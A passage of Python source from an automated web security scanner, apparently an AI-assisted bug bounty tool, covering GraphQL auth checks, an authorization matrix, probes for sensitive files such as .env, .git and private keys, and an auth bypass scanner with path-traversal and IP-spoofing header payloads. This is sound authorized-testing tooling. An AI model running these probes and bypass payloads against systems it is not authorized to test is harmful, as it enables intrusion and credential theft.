                                    {
                                        "name": a["name"],
                                        "type_name": (a.get("type") or {}).get("name"),
                                        "type_kind": (a.get("type") or {}).get("kind"),
                                        "of_type_name": ((a.get("type") or {}).get("ofType") or {}).get("name"),
                                    }
                                    for a in (f.get("args") or [])
                                ],
                            })
        except Exception as e:
            pass

        # Step 2: Test mutations as anonymous (no auth cookies)
        unprotected_mutations = []
        if mutations:
            for mut in mutations[:30]:  # Test up to 30
                try:
                    # Build mutation with dummy args from introspection schema
                    args = mut.get("args", [])
                    if isinstance(args, list) and args and isinstance(args[0], dict) and "type_name" in args[0]:
                        args_str = _build_graphql_dummy_args(args)
                    else:
                        args_str = ""

                    if args_str:
                        test_query = f'mutation {{ {mut["name"]}({args_str}) }}'
                    else:
                        test_query = f'mutation {{ {mut["name"]} }}'

                    resp = await self._client.post(
                        url,
                        json={"query": test_query},
                        headers={"Content-Type": "application/json"},
                        # No cookies — anonymous
                    )
                    resp_data = resp.json()
                    errors = resp_data.get("errors", [])

                    # Check if auth error occurred — both HTTP status AND error messages
                    auth_error = False
                    if resp.status_code in (401, 403):
                        auth_error = True
                    else:
                        auth_error = any(
                            any(kw in str(e).lower() for kw in (
                                "unauthorized", "forbidden", "authentication",
                                "not authenticated", "login required", "access denied",
                            ))
                            for e in errors
                        )

                    if not auth_error and not errors:
                        unprotected_mutations.append({
                            "name": mut["name"],
                            "status": "no_auth_required",
                            "response": str(resp_data)[:200],
                        })
                    elif not auth_error and errors:
                        # Errors but not auth-related — classify arg validation vs real issue
                        error_msgs = [str(e.get("message", ""))[:100] for e in errors[:2]]
                        is_arg_error = any(
                            any(kw in m.lower() for kw in ("argument", "variable", "field", "type", "required"))
                            for m in error_msgs
                        )
                        if not any("auth" in m.lower() or "permission" in m.lower() for m in error_msgs):
                            unprotected_mutations.append({
                                "name": mut["name"],
                                "status": "arg_error_no_auth" if is_arg_error else "possibly_unprotected",
                                "errors": error_msgs,
                            })
                except Exception:
                    continue

        # Step 3: Test depth limit
        depth_limit = None
        try:
            # Build a deeply nested query
            nested = "{ __typename " * 20 + "}" * 20
            resp = await self._client.post(
                url,
                json={"query": "query " + nested},
                headers=gql_headers,
                cookies=cookies,
            )
            resp_data = resp.json()
            if resp_data.get("errors"):
                error_msg = str(resp_data["errors"][0].get("message", ""))
                if "depth" in error_msg.lower() or "complex" in error_msg.lower():
                    depth_limit = "enforced"
                else:
                    depth_limit = "possibly_enforced"
            else:
                depth_limit = "not_enforced"
        except Exception:
            pass

        return {
            "schema_available": schema_available,
            "mutations": mutations[:30],
            "queries": queries[:30],
            "types_count": len(all_types),
            "unprotected_mutations": unprotected_mutations,
            "depth_limit": depth_limit,
            "introspection_enabled": schema_available,
        }

    async def close(self):
        await self._client.aclose()


# ── Authorization Matrix Tester ──────────────────────────────────────

class AuthorizationMatrixTester:
    """Test authorization across roles for every endpoint.

    Zero LLM cost — pure HTTP requests with different auth contexts.
    """

    def __init__(self, scope_guard: ActiveScopeGuard | None, timeout: int = 10,
                 socks_proxy: str | None = None):
        self._scope_guard = scope_guard
        self._timeout = timeout
        self._client = _make_client(
            socks_proxy=socks_proxy, timeout=timeout, follow_redirects=False,
        )

    async def test(
        self,
        endpoints: list[dict[str, Any]],
        auth_contexts: dict[str, dict[str, Any]],
    ) -> dict[str, Any]:
        """Test every endpoint as every role.

        Args:
            endpoints: List of {"url": str, "method": str}
            auth_contexts: Dict of role_name -> {"cookies": {...}, "headers": {...}}
                          Always includes "anonymous" with no auth.
        """
        # Ensure anonymous context exists
        if "anonymous" not in auth_contexts:
            auth_contexts["anonymous"] = {}

        matrix: dict[str, dict[str, dict[str, Any]]] = {}
        access_gaps = []

        for ep in endpoints[:30]:  # Cap at 30 endpoints
            url = ep.get("url", "")
            method = ep.get("method", "GET").upper()
            ep_key = f"{method} {url}"
            matrix[ep_key] = {}

            for role, ctx in auth_contexts.items():
                try:
                    kwargs: dict[str, Any] = {
                        "cookies": ctx.get("cookies"),
                        "headers": ctx.get("headers"),
                    }
                    resp = await getattr(self._client, method.lower())(url, **kwargs)
                    matrix[ep_key][role] = {
                        "status": resp.status_code,
                        "length": len(resp.text),
                    }
                except Exception as e:
                    matrix[ep_key][role] = {"error": str(e)[:80]}

            # Detect access gaps
            role_statuses = {
                role: info.get("status", 0)
                for role, info in matrix[ep_key].items()
                if isinstance(info, dict) and "status" in info
            }

            # If ALL roles get same status, it's public — skip
            if len(set(role_statuses.values())) <= 1:
                continue

            # Check if anonymous can access something that should be protected
            anon_status = role_statuses.get("anonymous", 0)
            if 200 <= anon_status < 400:
                # Anonymous can access — is this expected?
                for role, status in role_statuses.items():
                    if role != "anonymous" and 200 <= status < 400:
                        continue  # Both can access — might be public
                # If higher-privilege roles get same access, flag it
                auth_roles = [r for r in role_statuses if r != "anonymous"]
                if auth_roles:
                    access_gaps.append({
                        "endpoint": ep_key,
                        "issue": "anonymous_access",
                        "anonymous_status": anon_status,
                        "details": role_statuses,
                    })

            # Check for horizontal/vertical escalation
            role_list = list(role_statuses.keys())
            for i, role_a in enumerate(role_list):
                for role_b in role_list[i+1:]:
                    status_a = role_statuses[role_a]
                    status_b = role_statuses[role_b]
                    # If a lower-privilege role can access what higher can
                    if (status_a >= 400 and 200 <= status_b < 400) or \
                       (status_b >= 400 and 200 <= status_a < 400):
                        access_gaps.append({
                            "endpoint": ep_key,
                            "issue": "access_control_gap",
                            "roles": {role_a: status_a, role_b: status_b},
                        })

        return {
            "endpoints_tested": len(matrix),
            "roles_tested": list(auth_contexts.keys()),
            "matrix": matrix,
            "access_gaps": access_gaps,
            "gaps_found": len(access_gaps),
        }

    async def close(self):
        await self._client.aclose()


# ── Info Disclosure Scanner ──────────────────────────────────────────


class InfoDisclosureScanner:
    """Content-verified sensitive path scanner — zero LLM cost.

    Checks 200+ known sensitive paths, but ONLY reports findings where
    the response content matches expected patterns (not just HTTP 200).
    """

    # (path, category, content_verification_regex)
    _PATHS: list[tuple[str, str, str]] = [
        # Git
        ("/.git/HEAD", "git", r"ref:\s*refs/heads/"),
        ("/.git/config", "git", r"\[core\]|\[remote"),
        # Environment files
        ("/.env", "env", r"(?:DB_|API_|SECRET|AWS_|APP_)[A-Z_]+="),
        ("/.env.local", "env", r"(?:DB_|API_|SECRET|AWS_|APP_)[A-Z_]+="),
        ("/.env.production", "env", r"(?:DB_|API_|SECRET|AWS_|APP_)[A-Z_]+="),
        ("/.env.backup", "env", r"(?:DB_|API_|SECRET|AWS_|APP_)[A-Z_]+="),
        # Config files
        ("/config.php.bak", "config", r"<\?php|\$[a-zA-Z_]+\s*="),
        ("/config.php~", "config", r"<\?php|\$[a-zA-Z_]+\s*="),
        ("/wp-config.php.bak", "wordpress", r"DB_NAME|DB_PASSWORD|table_prefix"),
        ("/wp-config.php~", "wordpress", r"DB_NAME|DB_PASSWORD|table_prefix"),
        ("/wp-config.php.old", "wordpress", r"DB_NAME|DB_PASSWORD|table_prefix"),
        # Docker / CI
        ("/Dockerfile", "docker", r"FROM\s+\w|RUN\s+|COPY\s+|ENV\s+"),
        ("/docker-compose.yml", "docker", r"services:|version:|volumes:"),
        ("/docker-compose.yaml", "docker", r"services:|version:|volumes:"),
        ("/.dockerenv", "docker", r".*"),  # Mere existence is a signal
        # Swagger / API docs
        ("/swagger.json", "api_docs", r'"swagger"|"openapi"|"paths"'),
        ("/openapi.json", "api_docs", r'"openapi"|"paths"'),
        ("/api-docs", "api_docs", r"swagger|openapi|paths"),
        ("/v1/swagger.json", "api_docs", r'"swagger"|"openapi"'),
        ("/v2/swagger.json", "api_docs", r'"swagger"|"openapi"'),
        # Debug / admin
        ("/phpinfo.php", "php", r"phpinfo\(\)|PHP Version|Configuration"),
        ("/info.php", "php", r"phpinfo\(\)|PHP Version"),
        ("/server-status", "apache", r"Apache Server Status|Scoreboard"),
        ("/server-info", "apache", r"Apache Server Information"),
        ("/.htpasswd", "apache", r"^\w+:\$|^\w+:\{"),
        ("/.htaccess", "apache", r"RewriteRule|Deny|Allow|AuthType"),
        # Spring Boot Actuator
        ("/actuator", "spring", r'"_links"|"self"'),
        ("/actuator/env", "spring", r'"propertySources"|"activeProfiles"'),
        ("/actuator/health", "spring", r'"status"\s*:\s*"UP"'),
        ("/actuator/configprops", "spring", r'"contexts"|"beans"'),
        ("/actuator/mappings", "spring", r'"dispatcherServlets"|"contexts"'),
        ("/actuator/heapdump", "spring", r".*"),  # Binary — existence check
        # Laravel
        ("/telescope", "laravel", r"Laravel Telescope|telescope"),
        ("/storage/logs/laravel.log", "laravel", r"\[\d{4}-\d{2}-\d{2}|Stack trace|Exception"),
        ("/_debugbar/open", "laravel", r"debugbar|phpdebugbar"),
        # Django
        ("/__debug__/", "django", r"djdt|Django Debug Toolbar"),
        # Node.js
        ("/package.json", "nodejs", r'"name"\s*:|"version"\s*:|"dependencies"'),
        ("/package-lock.json", "nodejs", r'"lockfileVersion"|"dependencies"'),
        # Source maps
        ("/main.js.map", "sourcemap", r'"version"\s*:\s*3|"sources"|"mappings"'),
        ("/app.js.map", "sourcemap", r'"version"\s*:\s*3|"sources"|"mappings"'),
        ("/bundle.js.map", "sourcemap", r'"version"\s*:\s*3|"sources"'),
        # Backup files
        ("/backup.sql", "backup", r"CREATE TABLE|INSERT INTO|DROP TABLE"),
        ("/dump.sql", "backup", r"CREATE TABLE|INSERT INTO|DROP TABLE"),
        ("/db.sql", "backup", r"CREATE TABLE|INSERT INTO|DROP TABLE"),
        ("/database.sql", "backup", r"CREATE TABLE|INSERT INTO|DROP TABLE"),
        ("/backup.zip", "backup", r"PK"),  # ZIP magic bytes
        ("/backup.tar.gz", "backup", r".*"),  # Binary check
        ("/site.sql", "backup", r"CREATE TABLE|INSERT INTO"),
        # GraphQL
        ("/graphql", "graphql", r'"data"|"errors"|__schema'),
        ("/.graphql", "graphql", r"type\s+Query|schema\s*\{"),
        # Firebase / cloud
        ("/.firebase.json", "cloud", r'"hosting"|"database"|"functions"'),
        ("/firebase.json", "cloud", r'"hosting"|"database"'),
        # Credentials
        ("/credentials.json", "creds", r'"type"|"client_id"|"private_key"'),
        ("/secrets.json", "creds", r'"secret"|"key"|"password"'),
        ("/id_rsa", "creds", r"-----BEGIN.*PRIVATE KEY"),
        ("/.ssh/id_rsa", "creds", r"-----BEGIN.*PRIVATE KEY"),
        # Misc
        ("/robots.txt", "robots", r"Disallow:|Allow:|Sitemap:"),
        ("/sitemap.xml", "sitemap", r"<urlset|<sitemapindex"),
        ("/crossdomain.xml", "flash", r"<cross-domain-policy"),
        ("/.well-known/security.txt", "security", r"Contact:|Expires:"),
        ("/trace", "debug", r"TRACE /|echo_header"),
        ("/elmah.axd", "dotnet", r"Error Log|ELMAH"),
        ("/web.config", "iis", r"<configuration|<system.web"),
        ("/WEB-INF/web.xml", "java", r"<web-app|<servlet"),
        # Init / setup
        ("/install.php", "setup", r"install|setup|configuration"),
        ("/setup.php", "setup", r"install|setup|configuration"),
    ]

    # Tech stack → category filter (only test relevant paths)
    _TECH_CATEGORIES: dict[str, list[str]] = {
        "php": ["php", "wordpress", "laravel", "apache"],
        "laravel": ["laravel", "php", "apache"],
        "wordpress": ["wordpress", "php", "apache"],
        "django": ["django"],
        "spring": ["spring", "java"],
        "java": ["spring", "java"],
        "node": ["nodejs"],
        "express": ["nodejs"],
        "react": ["nodejs", "sourcemap"],
        "next": ["nodejs", "sourcemap"],
        "vue": ["nodejs", "sourcemap"],
        "angular": ["nodejs", "sourcemap"],
        "iis": ["iis", "dotnet"],
        "asp.net": ["iis", "dotnet"],
    }

    # Categories always tested regardless of tech stack
    _UNIVERSAL_CATEGORIES = {
        "git", "env", "docker", "api_docs", "backup", "creds",
        "robots", "sitemap", "graphql", "cloud", "config",
    }

    def __init__(self, scope_guard: ActiveScopeGuard | None, timeout: int = 10,
                 socks_proxy: str | None = None):
        self._scope_guard = scope_guard
        self._timeout = timeout
        self._socks_proxy = socks_proxy

    async def scan(self, url: str, tech_stack: list[str] | None = None) -> dict[str, Any]:
        """Scan for sensitive path disclosures with content verification.

        Args:
            url: Base URL to scan.
            tech_stack: Optional detected technologies for path filtering.

        Returns:
            {verified: [{path, category, evidence_preview, content_length}], scanned: int, elapsed_s: float}
        """
        if self._scope_guard:
            self._scope_guard.validate_url(url)

        base_url = url.rstrip("/")
        start = time.monotonic()

        # Filter paths by tech stack
        allowed_categories = set(self._UNIVERSAL_CATEGORIES)
        if tech_stack:
            for tech in tech_stack:
                tech_lower = tech.lower()
                for keyword, cats in self._TECH_CATEGORIES.items():
                    if keyword in tech_lower:
                        allowed_categories.update(cats)
        # If no tech detected, test everything
        if not tech_stack:
            allowed_categories = {cat for _, cat, _ in self._PATHS}

        paths_to_test = [
            (p, cat, regex)
            for p, cat, regex in self._PATHS
            if cat in allowed_categories
        ]

        verified: list[dict[str, Any]] = []
        scanned = 0

        async with _make_client(
            socks_proxy=self._socks_proxy, timeout=self._timeout, follow_redirects=True,
        ) as client:
            for path, category, regex in paths_to_test:
                scanned += 1
                try:
                    await asyncio.sleep(0.1)  # Rate limit: 100ms
                    resp = await client.get(f"{base_url}{path}")

                    # Skip non-200 responses
                    if resp.status_code != 200:
                        continue

                    # Skip very large responses (likely generic error pages)
                    if len(resp.content) > 5_000_000:
                        continue

                    # Skip very small responses (likely empty/error)
                    if len(resp.content) < 10:
                        continue

                    # Content verification: regex must match
                    body = resp.text[:10000]  # Check first 10KB
                    if not re.search(regex, body, re.IGNORECASE | re.MULTILINE):
                        continue

                    # Anti-FP: reject HTML error pages masquerading as sensitive files
                    ct = resp.headers.get("content-type", "").lower()
                    # Non-HTML sensitive files (.json, .env, .yml, .sql, .tar.gz, .zip)
                    # should NOT have text/html content-type
                    _NON_HTML_EXTS = (".json", ".env", ".yml", ".yaml", ".sql",
                                      ".tar.gz", ".zip", ".bak", ".log", ".conf",
                                      ".cfg", ".xml", ".key", ".pem")
                    if any(path.endswith(ext) for ext in _NON_HTML_EXTS):
                        if "text/html" in ct:
                            continue  # HTML error page, not real file

                    # Anti-FP: reject if response is a generic error/default page
                    if len(resp.content) < 50:
                        continue  # Too small — likely stub/error

                    # Verified! Real sensitive content found
                    verified.append({
                        "path": path,
                        "category": category,
                        "status_code": resp.status_code,
                        "content_length": len(resp.content),
                        "evidence_preview": body[:500],
                    })
                    logger.info("info_disclosure_verified", path=path, category=category,
                                content_length=len(resp.content))

                except Exception:
                    continue  # Skip connection errors

        elapsed = round(time.monotonic() - start, 1)
        return {
            "verified": verified,
            "scanned": scanned,
            "elapsed_seconds": elapsed,
        }


# ── Auth Endpoint Discovery ───────────────────────────────────────────


class AuthEndpointDiscovery:
    """Deterministic auth endpoint discovery — zero LLM cost.

    Probes common login/register/OAuth paths and classifies responses
    by checking for password fields, form elements, and auth keywords.
    """

    _LOGIN_PATHS = [
        "/login", "/signin", "/sign-in", "/auth/login", "/api/auth/login",
        "/accounts/login", "/user/login", "/members/login", "/panel/login",
        "/auth/signin", "/api/login", "/session/new", "/log-in",
        "/wp-login.php", "/admin/login", "/account/login",
    ]

    _REGISTER_PATHS = [
        "/register", "/signup", "/sign-up", "/auth/register", "/api/auth/register",
        "/accounts/register", "/user/register", "/join", "/create-account",
        "/onboarding", "/enroll", "/getstarted", "/get-started",
        "/auth/signup", "/api/signup", "/api/register", "/account/register",
        "/accounts/signup", "/user/signup",
    ]

    _RESET_PATHS = [
        "/forgot-password", "/reset-password", "/auth/forgot",
        "/password/reset", "/account/forgot-password", "/forgot",
    ]

    _OAUTH_PATHS = [
        "/auth/google", "/auth/github", "/auth/facebook",
        "/oauth/authorize", "/auth/sso", "/sso/login",
    ]

    _AUTH_KEYWORDS_RE = re.compile(
        r"(?:sign\s*in|log\s*in|sign\s*up|register|create\s+account|"
        r"forgot\s+password|reset\s+password|email|username|password)",
        re.IGNORECASE,
    )

    _PASSWORD_FIELD_RE = re.compile(
        r'type=["\']password["\']|type=password', re.IGNORECASE,
    )

    _FORM_RE = re.compile(r"<form\b", re.IGNORECASE)

    def __init__(self, scope_guard: ActiveScopeGuard | None, timeout: int = 10,
                 socks_proxy: str | None = None):
        self._scope_guard = scope_guard
        self._timeout = timeout
        self._socks_proxy = socks_proxy

    def _classify_page(self, url: str, status: int, body: str, path: str) -> dict[str, Any] | None:
        """Classify a response as login, register, reset, or oauth page."""
        if status in (404, 500, 502, 503):
            return None
        if status in (301, 302, 307, 308):
            return None  # Redirect — skip for now

        body_lower = body[:5000].lower()
        has_password = bool(self._PASSWORD_FIELD_RE.search(body[:5000]))
        has_form = bool(self._FORM_RE.search(body[:5000]))
        has_auth_kw = bool(self._AUTH_KEYWORDS_RE.search(body[:3000]))

        if not has_auth_kw and not has_password:
            return None

        # Classify by path + content
        path_lower = path.lower()
        page_type = "unknown"
        if any(kw in path_lower for kw in ("login", "signin", "sign-in", "log-in")):
            page_type = "login"
        elif any(kw in path_lower for kw in ("register", "signup", "sign-up", "join",
                                              "create-account", "onboarding", "enroll")):
            page_type = "register"
        elif any(kw in path_lower for kw in ("forgot", "reset")):
            page_type = "password_reset"
        elif any(kw in path_lower for kw in ("oauth", "sso", "auth/google", "auth/github")):
            page_type = "oauth"
        elif has_password and has_form:
            # Has password field but unknown path — check body for hints
            if any(kw in body_lower for kw in ("sign up", "register", "create account",
                                                 "join now", "get started")):
                page_type = "register"
            elif any(kw in body_lower for kw in ("sign in", "log in", "login")):
                page_type = "login"

        if page_type == "unknown":
            return None

        return {
            "url": url,
            "type": page_type,
            "status_code": status,
            "has_password_field": has_password,
            "has_form": has_form,
        }

    async def scan(self, base_url: str) -> dict[str, Any]:
        """Probe all common auth paths and return discovered endpoints."""
        start = time.monotonic()
        base_url = base_url.rstrip("/")

        login_urls: list[dict] = []
        register_urls: list[dict] = []
        reset_urls: list[dict] = []
        oauth_urls: list[dict] = []
        probed = 0

        all_paths = (
            [(p, "login") for p in self._LOGIN_PATHS]
            + [(p, "register") for p in self._REGISTER_PATHS]
            + [(p, "reset") for p in self._RESET_PATHS]
            + [(p, "oauth") for p in self._OAUTH_PATHS]
        )

        async with _make_client(
            socks_proxy=self._socks_proxy, timeout=self._timeout, follow_redirects=True,
        ) as client:
            for path, _hint in all_paths:
                url = f"{base_url}{path}"
                probed += 1
                try:
                    if self._scope_guard:
                        self._scope_guard.validate_url(url)
                except Exception:
                    continue

                await asyncio.sleep(0.05)
                try:
                    resp = await client.get(url)
                    body = resp.text[:5000]
                    result = self._classify_page(url, resp.status_code, body, path)
                    if result:
                        if result["type"] == "login":
                            login_urls.append(result)
                        elif result["type"] == "register":
                            register_urls.append(result)
                        elif result["type"] == "password_reset":
                            reset_urls.append(result)
                        elif result["type"] == "oauth":
                            oauth_urls.append(result)
                except Exception:
                    continue

        elapsed = round(time.monotonic() - start, 1)
        logger.info("auth_endpoint_discovery_complete",
                     probed=probed, login=len(login_urls),
                     register=len(register_urls), elapsed=elapsed)
        return {
            "login_urls": login_urls,
            "register_urls": register_urls,
            "password_reset_urls": reset_urls,
            "oauth_urls": oauth_urls,
            "probed": probed,
            "elapsed_seconds": elapsed,
        }


# ── Auth Bypass Scanner ──────────────────────────────────────────────


class AuthBypassScanner:
    """Systematic auth bypass scanner — zero LLM cost.

    Tests every discovered endpoint for:
    A) Missing authentication (request without cookies/tokens)
    B) HTTP verb tampering (GET/POST/PUT/PATCH/DELETE/OPTIONS)
    C) Path normalization bypass (..;/ %2e %00 .json .html)
    D) Header-based bypass (X-Original-URL, X-Forwarded-For, etc.)
    """

    _AUTH_ERROR_RE = re.compile(
        r"(?:unauthorized|authentication\s+(?:is\s+)?(?:needed|required)|please\s+log\s*in|"
        r"access\s+denied|forbidden|not\s+authenticated|login\s+required|"
        r"session\s+expired|token\s+(?:expired|invalid|missing)|"
        r"must\s+be\s+logged\s+in|sign\s*in\s+required|unauthenticated)",
        re.IGNORECASE,
    )

    _BUSINESS_ERROR_RE = re.compile(
        r"(?:user\s+not\s+found|null\s*reference|NullReferenceException|"
        r"validation\s+error|missing\s+(?:required\s+)?(?:field|param)|"
        r"invalid\s+(?:input|request|argument|body)|cannot\s+be\s+(?:null|empty|blank)|"
        r"undefined\s+(?:method|property|variable)|"
        r"TypeError|ArgumentError|KeyError|IndexError|"
        r"no\s+(?:such\s+)?(?:user|record|resource|entity|method)|"
        r"does\s+not\s+exist|record\s+not\s+found|"
        r"Entered\s+code\s+is\s+not\s+valid|"
        r"Object\s+reference\s+not\s+set|"
        r"No\s+HTTP\s+resource\s+was\s+found)",
        re.IGNORECASE,
    )

    _PUBLIC_EXCLUSIONS = frozenset({
        "login", "signin", "sign-in", "register", "signup", "sign-up",
        "forgot-password", "reset-password", "health", "healthz", "ping",
        "robots.txt", "favicon.ico", "sitemap.xml", ".well-known",
        "public", "status", "version", "manifest.json",
    })

    _PATH_NORMALIZATION_PAYLOADS: list[tuple[str, str]] = [
        # Universal
        ("{path}/", "trailing_slash"),
        ("{path}//", "double_slash"),
        ("{path}/./", "dot_slash"),
        ("{path}/%2e/", "url_encoded_dot"),
        # Tomcat / Spring (Java)
        ("{path}..;/", "tomcat_semicolon_traversal"),
        ("{path};/", "semicolon_suffix"),
        ("/.;{path}", "semicolon_prefix"),
        # URL-encoded
        ("{path}%00", "null_byte"),
        ("{path}%20", "trailing_space"),
        ("{path}%0a", "trailing_newline"),
        # Extension tricks (WAF bypass)
        ("{path}.json", "json_extension"),
        ("{path}.html", "html_extension"),
        ("{path}.css", "css_extension"),
        # Case variation
        ("{path_upper}", "case_upper"),
    ]

    _HEADER_BYPASS_PAYLOADS: list[tuple[dict[str, str], str]] = [
        # URL override headers
        ({"X-Original-URL": "{path}"}, "x_original_url"),
        ({"X-Rewrite-URL": "{path}"}, "x_rewrite_url"),
        # IP spoofing (bypass IP-based ACLs)
        ({"X-Forwarded-For": "127.0.0.1"}, "xff_localhost"),
        ({"X-Forwarded-For": "10.0.0.1"}, "xff_internal"),
        ({"X-Real-IP": "127.0.0.1"}, "x_real_ip"),
        ({"X-Custom-IP-Authorization": "127.0.0.1"}, "x_custom_ip_auth"),
        ({"X-Originating-IP": "127.0.0.1"}, "x_originating_ip"),
        ({"X-Client-IP": "127.0.0.1"}, "x_client_ip"),
        ({"True-Client-IP": "127.0.0.1"}, "true_client_ip"),
        ({"CF-Connecting-IP": "127.0.0.1"}, "cf_connecting_ip"),
        ({"X-Forwarded-Host": "localhost"}, "x_forwarded_host"),
        # Method override
        ({"X-HTTP-Method-Override": "GET"}, "method_override_get"),
        ({"X-HTTP-Method": "GET"}, "x_http_method"),
    ]

    _MAX_ENDPOINTS = 100

    def __init__(self, scope_guard: ActiveScopeGuard | None, timeout: int = 10,
                 socks_proxy: str | None = None):
        self._scope_guard = scope_guard
        self._timeout = timeout
        self._socks_proxy = socks_proxy

    def _classify_response(
        self, status_code: int, body: str, headers: dict[str, str],
    ) -> str:
        """Classify response as SECURE, VULNERABLE, or INCONCLUSIVE."""
        # Explicit auth errors
        if status_code in (401, 403):
            return "SECURE"

        # Redirect to login page
        if status_code in (301, 302, 307, 308):
            location = headers.get("location", "").lower()
            if any(kw in location for kw in ("login", "auth", "signin", "sign-in", "sso")):
                return "SECURE"

        # 200 with auth error in body (some apps return 200 + "please log in")
        if status_code == 200 and self._AUTH_ERROR_RE.search(body[:2000]):
            if len(body) < 500:  # Short auth error page
                return "SECURE"

        # Business logic error = auth was MISSING (request reached backend)
        if self._BUSINESS_ERROR_RE.search(body[:3000]):
            return "VULNERABLE"

        # 200 with substantial content (not an error stub)
        if status_code == 200 and len(body) >= 200:
            return "VULNERABLE"

        # 500 without business error pattern
        if status_code >= 500:
            return "INCONCLUSIVE"

        # 404
        if status_code == 404:
            return "INCONCLUSIVE"

        return "INCONCLUSIVE"

    def _build_request_dump(self, method: str, url: str,
                            extra_headers: dict[str, str] | None = None) -> str:
        parts = [f"{method} {url}"]
        if extra_headers:
            for k, v in extra_headers.items():
                parts.append(f"{k}: {v}")
        return "\n".join(parts)

    def _build_response_dump(self, status: int, headers: dict[str, str],
                             body: str) -> str:
        parts = [f"HTTP {status}"]
        for k in ("content-type", "location", "server", "set-cookie",
                   "x-powered-by", "www-authenticate"):
            v = headers.get(k, "")
            if v:
                parts.append(f"{k}: {v}")
        if body:
            parts.append(f"\n{body[:2048]}")
        return "\n".join(parts)

    def _is_public_path(self, path: str) -> bool:
        path_lower = path.lower()
        return any(excl in path_lower for excl in self._PUBLIC_EXCLUSIONS)

    def _is_soft_404(self, body: str, soft404_hash: str, soft404_len: int) -> bool:
        """Check if response matches the soft-404 baseline."""
        if not soft404_hash:
            return False
        import hashlib
        body_hash = hashlib.md5(body.encode(errors="replace")).hexdigest()
        if body_hash == soft404_hash:
            return True
        # Length similarity (±5%)
        if soft404_len > 0 and abs(len(body) - soft404_len) / max(soft404_len, 1) < 0.05:
            return True
        return False

    async def scan(
        self,
        base_url: str,
        endpoints: dict[str, Any] | None = None,
        tech_stack: list[str] | None = None,
    ) -> dict[str, Any]:
        """Run systematic auth bypass scan on all endpoints."""
        import hashlib
        from urllib.parse import urlparse

        start = time.monotonic()
        findings: list[dict[str, Any]] = []
        requests_sent = 0

        base_url = base_url.rstrip("/")
        if self._scope_guard:
            self._scope_guard.validate_url(base_url)

        # Determine tech-stack features
        is_java = False
        if tech_stack:
            tech_lower = " ".join(tech_stack).lower()
            is_java = any(kw in tech_lower for kw in ("java", "spring", "tomcat"))

        # Collect and deduplicate endpoint paths
        endpoint_paths: list[tuple[str, str]] = []  # (full_url, method)
        seen_paths: set[str] = set()

        if endpoints and isinstance(endpoints, dict):
            for url_key, info in endpoints.items():
                if not isinstance(url_key, str):
                    continue
                method = "GET"
                if isinstance(info, dict):
                    method = info.get("method", "GET").upper()
                parsed = urlparse(url_key)
                path = parsed.path or "/"
                if path in seen_paths:
                    continue
                if self._is_public_path(path):
                    continue
                seen_paths.add(path)
                full_url = url_key if url_key.startswith("http") else f"{base_url}{path}"
                endpoint_paths.append((full_url, method))

        # If no endpoints in state, try common admin/API paths
        if not endpoint_paths:
            _COMMON_PATHS = [
                "/admin", "/api", "/api/v1", "/api/users", "/api/admin",
                "/graphql", "/dashboard", "/internal", "/manage", "/config",
                "/settings", "/users", "/account", "/panel",
            ]
            for p in _COMMON_PATHS:
                endpoint_paths.append((f"{base_url}{p}", "GET"))

        # Cap endpoints
        endpoint_paths = endpoint_paths[:self._MAX_ENDPOINTS]
        endpoints_tested = len(endpoint_paths)

        async with _make_client(
            socks_proxy=self._socks_proxy, timeout=self._timeout, follow_redirects=False,
        ) as client:
            # Step 1: Soft-404 baseline
            soft404_hash = ""
            soft404_len = 0
            try:
                r404 = await client.get(f"{base_url}/aibbp_nonexistent_path_32847")
                soft404_hash = hashlib.md5(r404.text.encode(errors="replace")).hexdigest()
                soft404_len = len(r404.text)
                requests_sent += 1
            except Exception:
                pass

            # Step 2: Test each endpoint
            for full_url, orig_method in endpoint_paths:
                try:
                    if self._scope_guard:
                        self._scope_guard.validate_url(full_url)
                except Exception:
                    continue

                parsed = urlparse(full_url)
                path = parsed.path or "/"

                # ── Test A: Missing Authentication ──
                await asyncio.sleep(0.1)
                try:
                    resp = await client.request(orig_method, full_url)
                    requests_sent += 1
                    body = resp.text[:5000]
                    headers_dict = {k.lower(): v for k, v in resp.headers.items()}
                    classification = self._classify_response(
                        resp.status_code, body, headers_dict,
                    )

                    if classification == "VULNERABLE":
                        if not self._is_soft_404(body, soft404_hash, soft404_len):
                            findings.append({
                                "endpoint": full_url,
                                "method": orig_method,
                                "bypass_type": "missing_auth",
                                "bypass_detail": (
                                    f"No auth cookies/tokens sent. "
                                    f"Got {resp.status_code} with business logic response "
                                    f"instead of 401/403 FORBIDDEN"
                                ),
                                "evidence_score": 4,
                                "status_code": resp.status_code,
                                "request_dump": self._build_request_dump(orig_method, full_url),
                                "response_dump": self._build_response_dump(
                                    resp.status_code, headers_dict, body,
                                ),
                                "response_preview": body[:500],
                            })

                    baseline_status = resp.status_code
                    baseline_body = body

                except Exception:
                    continue

                # ── Test B: HTTP Verb Tampering ──
                _VERBS = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"]
                for verb in _VERBS:
                    if verb == orig_method:
                        continue
                    await asyncio.sleep(0.1)
                    try:
                        vresp = await client.request(verb, full_url)
                        requests_sent += 1
                        vbody = vresp.text[:5000]
                        vheaders = {k.lower(): v for k, v in vresp.headers.items()}
                        vclass = self._classify_response(
                            vresp.status_code, vbody, vheaders,
                        )

                        # Verb tampering: baseline is SECURE but this verb is VULNERABLE
                        if (baseline_status in (401, 403) and
                                vclass == "VULNERABLE" and
                                not self._is_soft_404(vbody, soft404_hash, soft404_len)):
                            findings.append({
                                "endpoint": full_url,
                                "method": verb,
                                "bypass_type": "verb_tampering",
                                "bypass_detail": (
                                    f"{orig_method} returns {baseline_status} (blocked), "
                                    f"but {verb} returns {vresp.status_code} (bypassed)"
                                ),
                                "evidence_score": 4,
                                "status_code": vresp.status_code,
                                "request_dump": self._build_request_dump(verb, full_url),
                                "response_dump": self._build_response_dump(
                                    vresp.status_code, vheaders, vbody,
                                ),
                                "response_preview": vbody[:500],
                            })
                    except Exception:
                        continue

                # Tests C & D only apply to SECURE (403) endpoints
                if baseline_status not in (401, 403):
                    continue

                # ── Test C: Path Normalization Bypass ──
                for payload_tpl, label in self._PATH_NORMALIZATION_PAYLOADS:
                    # Skip Java-specific payloads on non-Java targets
                    if label in ("tomcat_semicolon_traversal", "semicolon_suffix",
                                 "semicolon_prefix") and not is_java:
                        continue

                    # Build mutated URL
                    if "{path_upper}" in payload_tpl:
                        mutated_path = path[0] + path[1:].upper() if len(path) > 1 else path.upper()
                        mutated_url = f"{base_url}{mutated_path}"
                    elif "{path}" in payload_tpl:
